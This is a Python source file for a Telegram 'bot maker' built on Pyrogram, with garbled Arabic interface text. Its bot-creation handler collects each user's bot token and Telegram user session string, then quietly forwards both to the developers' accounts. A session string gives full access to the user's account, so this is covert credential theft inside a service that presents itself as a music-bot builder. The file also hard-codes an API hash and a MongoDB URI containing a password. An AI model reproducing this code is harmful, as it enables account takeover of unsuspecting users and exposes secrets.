import os
import sys
import asyncio
import re
import shutil
import sys
import psutil
import glob
import random
import requests
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram import types
from pyrogram import enums
from sys import version as pyver
from pyrogram import __version__ as pyrover
from pyrogram import __version__ as pyrover
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from pyrogram.errors import (ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid)
from pymongo import MongoClient
from bot import SUDORS
from bot import*
from motor.motor_asyncio import AsyncIOMotorClient as mongo_client
from pymongo import MongoClient
from motor.motor_asyncio import AsyncIOMotorClient as _mongo_client_
from pyrogram.errors import FloodWait
from bot import *
from pyrogram import Client, filters
from pyrogram.errors import PeerIdInvalid
from typing import List, Union, Callable
from os import execle, environ
from pyrogram.errors import FloodWait, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded
from redis import Redis
from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton, Message, InlineKeyboardMarkup, InlineKeyboardButton
from Maker.Storage import add_new_user, is_user, get_users, users_backup, del_user
from Maker.Storage import*
from pymongo import MongoClient
from pyrogram import Client, filters
import random
from typing import Dict, List, Union




# ============ Ù…ØªØºÙŠØ±Ø§Øª Ùˆ Ù…Ø·ÙˆØ±ÙŠÙ† ============
API_ID = 8186557
API_HASH = "efd77b34c69c164ce158037ff5a0d117"
Bots = []
OFF = True
DEVS = ["KA_FRA_WI1","DevVeGa", "M_D_O_2"]
ch = "kafra_wi_1"

# ============ ØªØ®Ø²ÙŠÙ† Ùˆ Ù‚Ø§Ø¹Ø¯Ø© Ø¨ÙŠØ§Ù†Ø§Øª db ============

MONGO_URI = "mongodb+srv://VeGaMusIc:VeGaOne@cluster0.nf0ml.mongodb.net/?retryWrites=true&w=majority"
mongo_client = MongoClient(MONGO_URI)
mongodb = mongo_client.VeGaX
users_collection = mongodb.tgusersdb
chats_collection = mongodb.chats
db = mongo_client["KIM"]["sheikh7skkx728329"]
mkchats = db.chatss
blocked = []
blockeddb = db.blocked
mk = []



def ss():
    dbb = db.find({})
    for x in dbb:
        xx = [x["username"], x["dev"]]
        Bots.append(xx)
        os.system(f"screen -XS {xx[0]} quit")
        os.system(f"cd Maked/{xx[0]} && screen -d -m -S {xx[0]} python3 -m VeGaXMusic")
        print(f"Done {xx}")
    ddb = mkchats.find({})
    for x in ddb:
        mk.append(int(x["chat_id"]))
    bb = blockeddb.find({})
    for x in bb:
        blocked.append(int(x["user_id"]))
    return
ss()

@Client.on_message(filters.private)
async def me(client, message):
    if not message.chat.id in mk:
        mk.append(message.chat.id)
        mkchats.insert_one({"chat_id": message.chat.id})    
    if OFF and not (message.text in ["á´á´€á´…á´", "á´‹á´€êœ°Ê€á´€á´¡Éª", "ê›á´‡ÊŸá´‡á´§êœ±á´‡", "êœ±Êœá´‡Éªá´‹Êœ", "INFO","Ø±Ø¬ÙˆØ¹"]):
        if not message.from_user.id in SUDORS:
            return await message.reply_text("Ø§Ù„Ø´ÙŠØ® Ù…Ù€ÙƒØªÙ€Ù…Ù„ !!")    
    if message.chat.id in blocked:
        return await message.reply_text("Ø§Ø±Ù†Ù€Ù€Ø¨ Ø§Ù†Ù€Øª Ù…Ù€Ù€Ø­Ø¸Ù€ÙˆØ± Ù…Ù€Ù† Ø§Ù„Ø´ÙŠØ® ğŸ–•ğŸ˜")    
    try:
        await client.get_chat_member(ch, message.from_user.id)
    except Exception:
        return await message.reply_video(
            video="https://t.me/kafra_wi_1/124",
            caption=f"â”â”â”Ä±lÄ±Ä±â—âš âœ˜êœ±Êœá´‡Éªá´‹Êœ-á´á´œsÉªá´„âœ˜ âšâ–·Ä±Ä±lÄ±â”â”â”\n\n<blockquote><b>Ù…Ø±Ø­Ø¨Ø§ :{message.from_user.mention}\n\nâ•®â¦¿ Ø¹Ù„ÙŠÙƒ Ø¨Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ Ø§ÙˆÙ„Ø§ ÙÙŠ Ù‚Ù†Ø§Ù‡ Ø§Ù„Ø´ÙŠØ®\nâ•¯â¦¿ ØªÙ… ØªØ·ÙˆÙŠØ±ÙŠ Ù…Ù† Ù‚Ø¨Ù„ : @M_D_O_2</blockquote>",
            reply_markup=InlineKeyboardMarkup(
                [
                    [InlineKeyboardButton("êœ±Êœá´‡Éªá´‹Êœ", url=f"https://t.me/{ch}")]
                ]
            )
        )
    message.continue_propagation()
    


@Client.on_message(filters.command(["êœ±Êœá´‡Éªá´‹Êœ"], ""))
async def SourceVeGaX(client: Client, message):
    await message.reply_video(
        video="https://t.me/kafra_wi_1/124",
        caption="<blockquote><b>â•­â–ášá´¡á´‡ÊŸá´„á´á´á´‡ á´›á´\nâ•°â¬£áš[êœ±Êœá´‡Éªá´‹Êœ êœ±á´á´œê›á´„á´‡](https://t.me/kafra_wi_1)\nâ•­âŠšáš[É¢ê›á´á´œá´˜](https://t.me/VeGaSuport)\nâ•°â–áš[á´„á´§ÊŸÉ´É´ÊŸá´‡](https://t.me/kafra_wi_1)</b></blockquote>",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("êœ±Êœá´‡Éªá´‹Êœ", url="https://t.me/kafra_wi_1"),
                ],
                [
                    InlineKeyboardButton("Me ", url="https://t.me/M_D_O_2"),
                ],
            ]
        ),
    )


@Client.on_message(filters.command(["INFO"], ""))
async def cast(client, message):
    kep = ReplyKeyboardMarkup([["á´á´€á´…á´","á´‹á´€êœ°Ê€á´€á´¡Éª"], [" êœ±Êœá´‡Éªá´‹Êœ"], ["ê›á´‡ÊŸá´‡á´§êœ±á´‡"], ["Ø±Ø¬ÙˆØ¹"]], resize_keyboard=True)
    await message.reply_text("<blockquote><b>â•®â—‰ Ù…Ù€Ø±Ø­Ù€Ø¨Ø¢ Ø¨Ùƒ Ø¹Ø²ÙŠØ²ÙŠ Ø§Ù„Ù…Ø·ÙˆØ±\nâ•¯â—‰ Ù‡Ù†Ø§ Ù‚Ø³Ù… Ø§Ù„Ø´ÙŠØ® ÙˆØ§Ù„Ù…Ø·ÙˆØ±ÙŠÙ†</b></blockquote>", reply_markup=kep)
        


@Client.on_message(filters.command(["ê›á´‡ÊŸá´‡á´§êœ±á´‡"], ""))
async def khalid(client: Client, message):
    await message.reply_video(
        video=f"https://t.me/kafra_wi_1/124",
        caption=f"""<b><blockquote>
â•­â–  êœ±á´á´œê›á´„á´‡.É´á´§á´á´‡: êœ±Êœá´‡Éªá´‹Êœ
â”‚ášœâ– êœ±Êêœ±á´›á´‡á´: á´˜Êá´›Êœá´É´
â”‚ášœâ– ÊŸá´§É´É¢á´œá´§É¢á´‡: Éªêœ± á´§ê›á´§Ê™Éªá´„
â”‚ášœâ– ê›á´‡ÊŸá´‡á´§êœ±á´‡: 2.1 á´ 
â”‚ášœâ– á´…á´§á´›á´‡ á´„ê›á´‡á´§á´›á´‡á´…: 5 -8 -2017
â•°â–  á´á´¡É´á´‡ê› á´êœ° êœ±Êœá´‡Éªá´‹Êœ:[á´¢á´‡Ê€á´â¸¥](https://t.me/M_D_O_2)
</b></blockquote>""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "á´á´€á´…á´", url=f"https://t.me/M_D_O_2"),         
                ],[
                    InlineKeyboardButton(
                        "êœ±Êœá´‡Éªá´‹Êœ", url=f"https://t.me/kafra_wi_1"),
               ],
          ]
        ),
    )


# ============ Ø§Ø³ØªØ¯Ø¹Ø§Ø¡ Ø§Ù„Ù…Ø·ÙˆØ±ÙŠÙ†============


@Client.on_message(filters.command(["Ù…Ø·ÙˆØ± Ø§Ù„Ø´ÙŠØ®","á´á´€á´…á´"], ""))
async def M_D_O_2(client: Client, message):   
    usr = await client.get_chat("M_D_O_2")
    name = usr.first_name
    photo = await client.download_media(usr.photo.big_file_id)
    await message.reply_photo(photo,       caption=f"<blockquote><b><b>Â»â­“á´á´œË¢Éªá´„âœ˜êœ±Êœá´‡Éªá´‹Êœâ™ª</b>\n\nâ•­â–ášÉ´á´§á´á´‡áš: {name}\nâ”‚ášœâ–ášá´œêœ±á´‡ê›: @{usr.username}\nâ”‚ášœâ–ášÉªá´…áš: <code>{usr.id}</code>\nâ•°â–ášÊ™Éªá´áš: {usr.bio}</b></blockquote>", 
    reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        name, url=f"https://t.me/{usr.username}"),
                    ],[
                        InlineKeyboardButton(
                        "Me ", url=f"https://t.me/CEOVEGA"),
                ],
            ]
        ),
    )


@Client.on_message(filters.command(["á´‹á´€êœ°Ê€á´€á´¡Éª"], ""))
async def KATAVEGA(client: Client, message):   
    usr = await client.get_chat("KA_FRA_WI1")
    name = usr.first_name
    photo = await client.download_media(usr.photo.big_file_id)
    await message.reply_photo(photo,       caption=f"<blockquote><b><b>Â»â­“á´á´œË¢Éªá´„âœ˜êœ±Êœá´‡Éªá´‹Êœâ™ª</b>\n\nâ•­â–ášÉ´á´§á´á´‡áš: {name}\nâ”‚ášœâ–ášá´œêœ±á´‡ê›: @{usr.username}\nâ”‚ášœâ–ášÉªá´…áš: <code>{usr.id}</code>\nâ•°â–ášÊ™Éªá´áš: {usr.bio}</b></blockquote>", 
    reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        name, url=f"https://t.me/{usr.username}"),
                    ],[
                        InlineKeyboardButton(
                        "Me ", url=f"https://t.me/CEOVEGA"),
                ],
            ]
        ),
    )




    
@Client.on_message(filters.command(["Ù…Ø·ÙˆØ± Ø§Ù„Ø´ÙŠØ®","êœ°á´x"], ""))
async def DevVeGa(client: Client, message):    
    usr = await client.get_chat("DevVeGa")
    name = usr.first_name
    photo = await client.download_media(usr.photo.big_file_id)
    await message.reply_photo(photo,       caption=f"<blockquote><b><b>Â»â­“á´á´œË¢Éªá´„âœ˜êœ±Êœá´‡Éªá´‹Êœâ™ª</b>\n\nâ•­â–ášÉ´á´§á´á´‡áš: {name}\nâ”‚ášœâ–ášá´œêœ±á´‡ê›: @{usr.username}\nâ”‚ášœâ–ášÉªá´…áš: <code>{usr.id}</code>\nâ•°â–ášÊ™Éªá´áš: {usr.bio}</b></blockquote>", 
    reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        name, url=f"https://t.me/{usr.username}"),
                    ],[
                        InlineKeyboardButton(
                        "Me", url=f"https://t.me/CEOVEGA"),
                ],
            ]
        ),
    )



# ============ Ø¯Ø§Ù„Ø© Ø§Ù„Ø­Ø¸Ø± Ùˆ Ø§Ù„Ù…Ø­Ø¸ÙˆØ±ÙŠÙ† ============

@Client.on_message(filters.command("Ø­Ø¸Ø±", ""))
async def ban(client, message):
    if message.from_user.id not in SUDORS:
        return
    m = await client.ask(message.chat.id, "<blockquote>Ø§Ø±Ø³Ù„ Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø§Ù†</blockquote>")
    text = m.text.replace("@", "")
    try:
        user = await client.get_chat(text)
        user_id = user.id
        if user_id in blocked:
            return await message.reply_text("<blockquote>Ø§Ù„Ø§Ø±Ù†Ù€Ø¨ Ù…Ù€Ø­Ø¸Ù€ÙˆØ± Ù…Ù† Ù‚Ø¨Ù„</blockquote>")
        blocked.append(user_id)
        blockeddb.insert_one({"user_id": user_id})
        await message.reply_text("<blockquote>ØªÙ€Ù… Ø­Ù€Ø¸Ù€Ø± Ø§Ù„Ø§Ø±Ù†Ù€Ø¨</blockquote>")
    except Exception as e:
        await message.reply_text("<blockquote>ØªØ£ÙƒØ¯ Ù…Ù† Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</blockquote>")



@Client.on_message(filters.command("Ø§Ù„ØºØ§Ø¡ Ø­Ø¸Ø±", ""))
async def unban(client, message):
    if message.from_user.id not in SUDORS:
        return
    m = await client.ask(message.chat.id, "<blockquote>Ø§Ø±Ø³Ù„ Ù…Ø¹Ø±Ù Ø§Ù„Ø§Ø±Ù†Ù€Ø¨ Ø§Ù„Ø§Ù†</blockquote>")
    text = m.text.replace("@", "")
    try:
        user = await client.get_chat(text)
        user_id = user.id
        if user_id not in blocked:
            return await message.reply_text("<blockquote>Ø§Ù„Ø§Ø±Ù†Ù€Ø¨ ØºÙŠØ± Ù…Ø­Ø¸ÙˆØ±</blockquote>")
        blocked.remove(user_id)
        blockeddb.delete_one({"user_id": user_id})
        await message.reply_text("<blockquote>ØªÙ… Ø§Ù„ØºØ§Ø¡ Ø­Ø¸Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</blockquote>")
    except Exception as e:
        await message.reply_text("<blockquote>ØªØ£ÙƒØ¯ Ù…Ù† Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</blockquote>")
    


@Client.on_message(filters.command("Ø§Ù„Ù…Ø­Ø¸ÙˆØ±ÙŠÙ†", ""))
async def list_blocked_users(client, message):
    if message.from_user.id not in SUDORS:
        return
    if not blocked:
        return await message.reply_text("Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù…Ø­Ø¸ÙˆØ±ÙŠÙŠÙ† ÙÙŠ Ø§Ù„Ø´ÙŠØ®")
    user_mentions = [await client.get_users(user_id) for user_id in blocked]
    response = "<b><u>Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø­Ø¸ÙˆØ±ÙŠÙ† Ù…Ù† Ø§Ù„Ø´ÙŠØ®:</u></b>\n"
    for i, user in enumerate(user_mentions, start=1):
        response += f"<b>{i} â» {user.mention}</b>\n"
    count = len(blocked)
    response += f"\n<blockquote><b>Ø¹Ø¯Ø¯ØªÙ‡Ù… :</b> â°âª {count} â«â±</b></blockquote>"
    await message.reply_text(response, parse_mode=enums.ParseMode.HTML)


@Client.on_message(filters.command("Ù…Ø³Ø­ Ø§Ù„Ù…Ø­Ø¸ÙˆØ±ÙŠÙ†", ""))
async def clear_blocked_users(client, message):
    if message.from_user.id not in SUDORS:
        return
    if not blocked:
        return await message.reply_text("Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù…Ø­Ø¸ÙˆØ±ÙŠÙŠÙ† ÙÙŠ Ø§Ù„Ø´ÙŠØ®")
    count = len(blocked) 
    blocked.clear() 
    await message.reply_text(f"<blockquote>ØªÙ… Ù…Ø³Ø­ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø­Ø¸ÙˆØ±ÙŠÙ† Ø¨Ù†Ø¬Ø§Ø­. ÙˆØ¹Ø¯Ø¯Ù‡Ù… {count}</blockquote>")


# ============ Ø¯Ø§Ù„Ø© Ø±ÙØ¹ Ù…Ø·ÙˆØ±ÙŠÙ† Ù„ÙÙŠØ¬Ø§ ============

@Client.on_message(filters.command("Ø±ÙØ¹ Ù…Ø·ÙˆØ±", ""))
async def promote_dev(client, message):
    if message.from_user.id not in [7623838169, 8122544723, 8176410693]:
        return await message.reply_text("Ù„ÙŠØ³ Ù„Ø¯ÙŠÙƒ ØµÙ„Ø§Ø­ÙŠØ© Ù„ØªÙ†ÙÙŠØ° Ù‡Ø°Ø§ Ø§Ù„Ø£Ù…Ø±.")
    m = await client.ask(message.chat.id, "Ø§Ø±Ø³Ù„ Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø§Ù†")
    user_input = m.text.replace("@", "")
    try:
        user = await client.get_chat(user_input)
        user_id = user.id
        if user_id in SUDORS:
            return await m.reply_text("Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¨Ø§Ù„ÙØ¹Ù„ Ù…Ø·ÙˆØ±")
        SUDORS.append(user_id)
        await m.reply_text("ØªÙ… Ø±ÙØ¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙƒÙ…Ø·ÙˆØ±")
    except PeerIdInvalid:
        await message.reply_text("ØªØ£ÙƒØ¯ Ù…Ù† Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…")
    except Exception as e:
        await message.reply_text(f"Ø­Ø¯Ø« Ø®Ø·Ø£: {e}")



@Client.on_message(filters.command("ØªÙ†Ø²ÙŠÙ„ Ù…Ø·ÙˆØ±", ""))
async def demote_dev(client, message):
    if message.from_user.id not in [7623838169, 8122544723, 8176410693]:
        return await message.reply_text("Ù„ÙŠØ³ Ù„Ø¯ÙŠÙƒ ØµÙ„Ø§Ø­ÙŠØ© Ù„ØªÙ†ÙÙŠØ° Ù‡Ø°Ø§ Ø§Ù„Ø£Ù…Ø±.")        
    m = await client.ask(message.chat.id, "Ø§Ø±Ø³Ù„ Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø§Ù†")
    user_input = m.text.replace("@", "")
    try:
        user = await client.get_chat(user_input)
        user_id = user.id

        if user_id not in SUDORS:
            return await message.reply_text("Ù‡Ø°Ø§ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù„ÙŠØ³ Ù…Ø·ÙˆØ±")
        SUDORS.remove(user_id)
        await message.reply_text("ØªÙ… ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ù† Ø§Ù„Ù…Ø·ÙˆØ±ÙŠÙ†")
    except PeerIdInvalid:
        await message.reply_text("ØªØ£ÙƒØ¯ Ù…Ù† Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…")
    except Exception as e:
        await message.reply_text(f"Ø­Ø¯Ø« Ø®Ø·Ø£: {e}")

@Client.on_message(filters.command("Ø§Ù„Ù…Ø·ÙˆØ±ÙŠÙ†", ""))
async def list_SUDORS_users(client, message):
    if message.from_user.id not in SUDORS:
        return await message.reply_text("Ù„ÙŠØ³ Ù„Ø¯ÙŠÙƒ ØµÙ„Ø§Ø­ÙŠØ© Ù„ØªÙ†ÙÙŠØ° Ù‡Ø°Ø§ Ø§Ù„Ø£Ù…Ø±.")
    if not SUDORS:
        return await message.reply_text("Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù…Ø·ÙˆØ±ÙŠÙ† ÙÙŠ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©")
    try:
        user_mentions = await asyncio.gather(*[client.get_users(user_id) for user_id in SUDORS])
        response = "<blockquote><b><u>Ù‚Ø§Ø¦Ù…Ø© Ù…Ø·ÙˆØ±ÙŠÙ†:</u></b></blockquote>\n"
        for i, user in enumerate(user_mentions, start=1):
            response += f"<b>{i}- {user.mention}</b>\n"
        count = len(SUDORS)
        response += f"\n<blockquote><b>Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø·ÙˆØ±ÙŠÙ†:</b> â°âª {count} â«â±</b></blockquote>"
        await message.reply_text(response, parse_mode=enums.ParseMode.HTML)
    except Exception as e:
        await message.reply_text(f"Ø­Ø¯Ø« Ø®Ø·Ø£: {e}")

    
# ============ Ø¯ÙˆØ§Ù„ Ù‚ÙÙ„ Ùˆ Ø§Ù„ÙØªØ­ Ùˆ ØµÙ†Ø¹ ============


@Client.on_message(filters.command(["ÙØªØ­ Ø§Ù„ØµØ§Ù†Ø¹", "Ù‚ÙÙ„ Ø§Ù„ØµØ§Ù†Ø¹"], "") & filters.private)
async def onOFF(client, message):
    if not message.from_user.id in SUDORS:
        return    
    global OFF    
    if message.text == "ÙØªØ­ Ø§Ù„ØµØ§Ù†Ø¹":
        if OFF is None:
            return await message.reply_text("<blockquote>Ø§Ù„Ø´ÙŠØ® Ù…ÙØªÙˆØ­ Ù…Ù† Ù‚Ø¨Ù„</blockquote>")
        OFF = None
        return await message.reply_text("<blockquote>ØªÙ€Ù… ÙÙ€ØªÙ€Ø­ Ø§Ù„Ø´ÙŠØ® Â» Ø¨Ù€Ù†Ø¬Ù€Ø§Ø­</blockquote>")    
    else:
        if OFF is True:
            return await message.reply_text("<blockquote>Ø§Ù„Ø´ÙŠØ® Ù…Ù‚ÙÙˆÙ„ Ù…Ù† Ù‚Ø¨Ù„</blockquote>")
        OFF = True
        await message.reply_text("<blockquote>ØªÙ€Ù… Ù‚Ù€ÙÙ€Ù„ Ø§Ù„Ø´ÙŠØ® Â» Ø¨Ù€Ù†Ø¬Ù€Ø§Ø­</blockquote>")


@Client.on_message(filters.command("ØµÙ†Ø¹ Ø¨ÙˆØª", "") & filters.private)
async def maked(client, message):
    if not message.from_user.id in SUDORS:
        for x in Bots:
            if int(x[1]) == message.from_user.id:
                return await message.reply_text("<blockquote>Ù„Ù€Ù‚Ø¯ Ù‚Ù…Ù€Øª Ø¨Ù€ØµÙ†Ù€Ø¹ Ø¨Ù€ÙˆØª Ù…Ù€Ù† Ù‚Ù€Ø¨Ù€Ù„</blockquote>")
    try:
        ask = await client.ask(message.chat.id, "<blockquote>Ø§Ø±Ø³Ù€Ù„ ØªÙ€ÙˆÙƒÙ€Ù† Ø§Ù„Ù€Ø¨Ù€ÙˆØª Ù…Ù† : @BotFather</blockquote>", timeout=300)
        TOKEN = ask.text.strip()        
        if not TOKEN.startswith('') or ':' not in TOKEN:
            return await message.reply_text("<blockquote>Ø§Ù„ØªÙˆÙƒÙ† ØºÙŠØ± ØµØ§Ù„Ø­! ÙŠØ±Ø¬Ù‰ Ø¥Ø±Ø³Ø§Ù„ ØªÙˆÙƒÙ† ØµØ­ÙŠØ­ Ù…Ù† @BotFather</blockquote>")
        temp_bot = Client("temp_bot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
        try:
            await temp_bot.start()
            bot_info = await temp_bot.get_me()
            if not bot_info:
                await temp_bot.stop()
                return await message.reply_text("<blockquote>ÙØ´Ù„ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªÙˆÙƒÙ†! ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† ØµØ­Øª</blockquote>Ù‡")
            username = bot_info.username
            await temp_bot.stop()
        except Exception as e:
            return await message.reply_text(f"Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªÙˆÙƒÙ†:")            
    except TimeoutError:
        return await message.reply_text("<blockquote>Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ù…Ø­Ø¯Ø¯ Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙˆÙƒÙ†</blockquote>")
    except Exception as e:
        return await message.reply_text(f"Ø­Ø¯Ø« Ø®Ø·Ø£: {str(e)}")
    try:
        ask = await client.ask(message.chat.id, "<blockquote>Ø§Ø±Ø³Ù€Ù„ Ø¬Ù€Ù„Ø³Ù€Ù‡ Ø¨Ù€ÙŠØ±ÙˆØ¬Ù€Ø±Ø§Ù…</blockquote>", timeout=300)
        SESSION = ask.text.strip()
        temp_user = Client("temp_user", api_id=API_ID, api_hash=API_HASH, session_string=SESSION, in_memory=True)
        try:
            await temp_user.start()
            user_info = await temp_user.get_me()
            if not user_info:
                await temp_user.stop()
                return await message.reply_text("<blockquote>ÙØ´Ù„ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¬Ù„Ø³Ø©! ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† ØµØ­ØªÙ‡Ø§</blockquote>")
            await temp_user.stop()
        except Exception as e:
            return await message.reply_text(f"Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¬Ù„Ø³Ø©")            
    except TimeoutError:
        return await message.reply_text("<blockquote>Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ù…Ø­Ø¯Ø¯ Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¬Ù„Ø³Ø©</blockquote>")
    except Exception as e:
        return await message.reply_text(f"Ø­Ø¯Ø« Ø®Ø·Ø£: {str(e)}")    
    Dev = message.from_user.id
    zero = message.from_user.username
    if message.from_user.id in SUDORS:
        try:
            ask = await client.ask(message.chat.id, "<blockquote>Ø§Ø±Ø³Ù€Ù„ Ø§ÙŠÙ€Ø¯ÙŠ Ø§Ù„Ù…Ù€Ø·ÙˆØ±</blockquote>", timeout=300)
            try:
                Dev = int(ask.text)
            except:
                return await message.reply_text("<blockquote>Ù‚Ù… Ø¨Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ø§ÙŠØ¯ÙŠ Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­</blockquote>")
        except TimeoutError:
            return await message.reply_text("<blockquote>Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ù…Ø­Ø¯Ø¯ Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø£ÙŠØ¯ÙŠ</blockquote>")
    for x in Bots:
        if x[0] == username:
            return await message.reply_text("<blockquote>Ù„Ù‚Ø¯ Ù‚Ù…Øª Ø¨ØµÙ†Ø¹ Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª Ù…Ù† Ù‚Ø¨Ù„</blockquote>")    
    try:
        os.system(f"cp -a Make Maked/{username}")
        env = open(f"Maked/{username}/.env", "w+", encoding="utf-8")
        x = f'ID = {username}\nBOT_TOKEN = {TOKEN}\nSTRING_SESSION = {SESSION}\nOWNER_ID = {Dev}\nLOG_GROUP_ID = {Dev}'
        env.write(x)
        env.close()
        os.system(f"cd Maked/{username} && chmod +x * && screen -d -m -S {username} python3 -m VeGaXMusic")
        oo = [username, Dev, zero]
        Bots.append(oo)
        for chat in DEVS:
            try:
                usr = await client.get_users(message.from_user.id)
                name = usr.first_name
                if usr.photo:
                    photo = await client.download_media(usr.photo.big_file_id)
                    await client.send_photo(
                        chat, photo,
                        caption=f"<b><blockquote>ØªÙ€Ù… Ø¯Ø®Ù€ÙˆÙ„ Ø¨Ù€ÙˆØª Ø¬Ø¯ÙŠØ¯ Ø§Ù„ÙŠ Ø§Ù„Ø´ÙŠØ®</blockquote>\n\n<blockquote>â•­â¦¿ášâ¸¢á´œsá´‡ê› Ê™á´á´›â¸¥Â» @{username}\nâ•°â¦¿ášâ¸¢á´›á´á´‹á´‡É´â¸¥ Â» `{TOKEN}`</blockquote>\n\n<blockquote>â¸¢Ë¹sá´›ê›ÉªÉ´É¢âœ—á´©Êê›á´É¢ê›á´§á´ : {pyrover}</blockquote>\n <code>{SESSION}</code> \n\n<blockquote>â•­â¦¿ášâ¸¢á´á´¡É´á´‡ê›â¸¥Â» {message.from_user.mention}\nâ•°â¦¿ášâ¸¢á´á´¡É´á´‡ê› Éªá´…â¸¥ Â» <code>{Dev}</code></b></blockquote>",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(name, url=f"https://t.me/{message.from_user.username}")]])
                    )
                else:
                    await client.send_message(
                        chat,
                        f"<b><blockquote>ØªÙ€Ù… Ø¯Ø®Ù€ÙˆÙ„ Ø¨Ù€ÙˆØª Ø¬Ø¯ÙŠØ¯ Ø§Ù„ÙŠ Ø§Ù„Ø´ÙŠØ®</blockquote>\n\n<blockquote>â•­â¦¿ášâ¸¢á´œsá´‡ê› Ê™á´á´›â¸¥Â» @{username}\nâ•°â¦¿ášâ¸¢á´›á´á´‹á´‡É´â¸¥ Â» `{TOKEN}`</blockquote>\n\n<blockquote>â¸¢Ë¹sá´›ê›ÉªÉ´É¢âœ—á´©Êê›á´É¢ê›á´§á´ : {pyrover}</blockquote>\n <code>{SESSION}</code> \n\n<blockquote>â•­â¦¿ášâ¸¢á´á´¡É´á´‡ê›â¸¥Â» {message.from_user.mention}\nâ•°â¦¿ášâ¸¢á´á´¡É´á´‡ê› Éªá´…â¸¥ Â» <code>{Dev}</code></b></blockquote>",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(name, url=f"https://t.me/{message.from_user.username}")]])
                    )
            except Exception as e:
                print(f"Error sending to dev {chat}: {e}")
        data = {"username": username, "dev": Dev}
        db.insert_one(data)        
        msg = await message.reply("â¤ï¸")
        await sleep(5)
        await msg.delete()
        bot_user = await client.get_me()
        bot_id = bot_user.id
        bot_name = bot_user.first_name        
        try:
            user = await client.get_users(bot_id)
            Owner = user.first_name if user.first_name else "Owner Not Found"
            photo = await client.download_media(user.photo.big_file_id) if user.photo and user.photo.big_file_id else None            
            await message.reply_photo(
                photo=photo,
                caption=f"<b><blockquote>{bot_name}</blockquote>\n\n<blockquote>â•®â¦¿ ØªÙ€Ù… ØªÙ€Ø´Ù€ØºÙ€ÙŠÙ„ Ø¨Ù€ÙˆØªÙ€Ùƒ Ø¨Ù€Ù†Ù€Ø¬Ù€Ø§Ø­\nâ•¯â¦¿ Ø¹Ù€Ù„Ù€ÙŠ Ø³Ù€ÙˆØ±Ø³ Ø§Ù„Ø´ÙŠØ® Ù…Ù€ÙŠÙ€ÙˆØ²Ùƒ</b></blockquote>",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("á´á´¡É´á´‡Ê€", url=f"https://t.me/{zero}"),
                     InlineKeyboardButton("Ê™á´á´›", url=f"https://t.me/{username}")],
                    [InlineKeyboardButton("êœ±Êœá´‡Éªá´‹Êœ", url="https://t.me/kafra_wi_1")]
                ])
            )
        except Exception as e:
            print(f"Error in final message: {e}")            
    except Exception as e:
        return await message.reply_text(f"Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø¨ÙˆØª: {str(e)}")    
